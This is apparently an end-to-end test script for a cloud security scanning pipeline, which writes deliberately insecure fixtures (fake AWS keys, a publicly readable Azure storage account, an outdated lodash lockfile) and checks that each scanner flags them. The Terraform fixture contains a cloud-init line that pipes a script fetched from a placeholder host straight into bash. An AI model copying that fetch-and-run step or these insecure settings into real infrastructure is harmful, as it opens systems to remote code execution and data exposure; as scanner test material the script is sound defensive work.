#!/usr/bin/env bash
set -euo pipefail

log()  { echo "[CloudSentinel][shift-left-e2e] $*"; }
fail() { echo "[CloudSentinel][shift-left-e2e][ERROR] $*" >&2; exit 1; }

REPO_ROOT="$(git rev-parse --show-toplevel 2>/dev/null || pwd)"
cd "$REPO_ROOT"

FIXTURE_ROOT="${CS_E2E_FIXTURE_ROOT:-.cloudsentinel/e2e-shift-left-one-finding}"
GITLEAKS_FIXTURE="$FIXTURE_ROOT/gitleaks"
IAC_FIXTURE="$FIXTURE_ROOT/iac"
TRIVY_FIXTURE="$FIXTURE_ROOT/trivy"
TRIVY_CACHE_DIR_EFF="${TRIVY_CACHE_DIR:-.trivy-cache}"

export CLOUDSENTINEL_SCAN_ID="${CLOUDSENTINEL_SCAN_ID:-1111111111111111111111111111111111111111}"
export CLOUDSENTINEL_HMAC_SECRET="${CLOUDSENTINEL_HMAC_SECRET:-cloudsentinel-local-e2e-secret}"
export CLOUDSENTINEL_FAIL_CLOSED="${CLOUDSENTINEL_FAIL_CLOSED:-false}"
export CI_ENVIRONMENT_NAME="${CI_ENVIRONMENT_NAME:-prod}"
export TRIVY_IMAGE_MIN_REPORTS="${TRIVY_IMAGE_MIN_REPORTS:-0}"

command -v jq >/dev/null 2>&1 || fail "jq binary missing"
command -v python3 >/dev/null 2>&1 || fail "python3 binary missing"

log "Preparing controlled fixtures under ${FIXTURE_ROOT}"
rm -rf "$FIXTURE_ROOT"
rm -f \
  .cloudsentinel/gitleaks_raw.json .cloudsentinel/gitleaks_raw.json.hmac \
  .cloudsentinel/gitleaks_range_raw.json .cloudsentinel/gitleaks_range_raw.json.hmac \
  .cloudsentinel/checkov_raw.json .cloudsentinel/checkov_raw.json.hmac \
  .cloudsentinel/checkov_scan.log \
  .cloudsentinel/cloudinit_analysis.json .cloudsentinel/cloudinit_analysis.json.hmac \
  .cloudsentinel/golden_report.json .cloudsentinel/golden_report.json.hmac \
  .cloudsentinel/exceptions.json .cloudsentinel/dropped_exceptions.json \
  .cloudsentinel/audit_events.jsonl .cloudsentinel/artifact_contract_report.json \
  .cloudsentinel/opa_decision.json .cloudsentinel/opa_decision.json.hmac \
  shift-left/trivy/reports/raw/trivy-fs-raw.json \
  shift-left/trivy/reports/raw/trivy-fs-raw.json.hmac
rm -rf shift-left/trivy/reports/raw/image
mkdir -p "$GITLEAKS_FIXTURE" "$IAC_FIXTURE" "$TRIVY_FIXTURE" shift-left/trivy/reports/raw/image

cat > "$GITLEAKS_FIXTURE/leak.env" <<'EOF'
AWS_ACCESS_KEY_ID=AKIA1234567890ABCDEF
AWS_SECRET_ACCESS_KEY=bJalrXUtnFEMI/K7MDENG/bPxRfiCYABCDMOCK
EOF

cat > "$IAC_FIXTURE/main.tf" <<'EOF'
resource "azurerm_storage_account" "public_blob" {
  name                          = "cse2epublicblob001"
  resource_group_name           = "rg-cloudsentinel-e2e"
  location                      = "westeurope"
  account_tier                  = "Standard"
  account_replication_type      = "LRS"
  allow_nested_items_to_be_public = true
  min_tls_version               = "TLS1_2"
  https_traffic_only_enabled    = true
}

resource "azurerm_linux_virtual_machine" "cloudinit_remote_exec" {
  name                = "vm-cloudsentinel-e2e"
  resource_group_name = "rg-cloudsentinel-e2e"
  location            = "westeurope"
  size                = "Standard_B1s"
  admin_username      = "cloudsentinel"
  custom_data         = base64encode(<<-CLOUDINIT
    #cloud-config
    runcmd:
      - curl http://example.invalid/bootstrap.sh | bash
  CLOUDINIT
  )

  tags = {
    "cs:role"    = "web-server"
    "Environment" = "prod"
  }
}
EOF

cat > "$TRIVY_FIXTURE/package-lock.json" <<'EOF'
{
  "name": "cloudsentinel-trivy-e2e",
  "version": "1.0.0",
  "lockfileVersion": 1,
  "requires": true,
  "dependencies": {
    "lodash": {
      "version": "4.17.20",
      "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.20.tgz",
      "integrity": "sha512-PlhdxvG1VxnrYmPc8rJqf8d5S2La9J0X6Z5qUu2r1bWl8nYwW5drV1IkDqzD8sX7tb2rT0h7QwK0tD8pS2Z8Cg=="
    }
  }
}
EOF

log "Running Gitleaks fixture scan"
SCAN_MODE=local \
SCAN_TARGET=repo \
GITLEAKS_SOURCE_PATH="$GITLEAKS_FIXTURE" \
GITLEAKS_NO_GIT=true \
bash ci/scripts/shift-left/gitleaks-scan.sh

log "Running Checkov fixture scan"
CHECKOV_SCAN_TARGET="$IAC_FIXTURE" \
CHECKOV_CHECKS="CKV2_CS_AZ_001" \
bash ci/scripts/shift-left/checkov-scan.sh

if [[ ! -s "${TRIVY_CACHE_DIR_EFF}/db/trivy.db" ]]; then
  log "Trivy DB cache missing; warming DB once before the controlled scan"
  bash ci/scripts/shift-left/trivy-db-warm.sh
else
  log "Trivy DB cache present; using warmed DB for the controlled scan"
fi

log "Running Trivy filesystem fixture scan"
TRIVY_FS_TARGET="$TRIVY_FIXTURE" \
TRIVY_IMAGE_TARGETS="" \
TRIVY_SKIP_DB_UPDATE_IN_SCAN=true \
TRIVY_SKIP_JAVA_DB_UPDATE_IN_SCAN=true \
bash ci/scripts/shift-left/trivy-fs-scan.sh

log "Running CloudInit fixture scan"
CLOUDINIT_TERRAFORM_DIR="$IAC_FIXTURE" \
bash ci/scripts/shift-left/cloudinit-scan.sh

log "Normalizing reports and validating artifact contracts"
bash ci/scripts/shift-left/normalize-reports.sh
bash ci/scripts/shift-left/contract-test.sh

log "Running OPA in advisory mode to validate decision layer without failing the E2E on expected DENY"
OPA_PREFER_CLI=true bash shift-left/opa/run-opa.sh --advisory

log "Verifying Golden Report scanner coverage"
jq -e '
  def count_tool($tool): [.findings[]? | select(.source.tool == $tool)] | length;
  {
    gitleaks: count_tool("gitleaks"),
    checkov: count_tool("checkov"),
    trivy: count_tool("trivy"),
    cloudinit: count_tool("cloudinit")
  } as $counts
  | ($counts | to_entries | all(.value >= 1))
' .cloudsentinel/golden_report.json >/dev/null \
  || fail "Golden Report does not contain at least one finding for every scanner"

jq -r '
  def count_tool($tool): [.findings[]? | select(.source.tool == $tool)] | length;
  [
    ["scanner", "findings"],
    ["gitleaks", (count_tool("gitleaks") | tostring)],
    ["checkov", (count_tool("checkov") | tostring)],
    ["trivy", (count_tool("trivy") | tostring)],
    ["cloudinit", (count_tool("cloudinit") | tostring)]
  ]
  | .[]
  | @tsv
' .cloudsentinel/golden_report.json

log "PASS: Shift-Left E2E produced at least one finding per scanner"
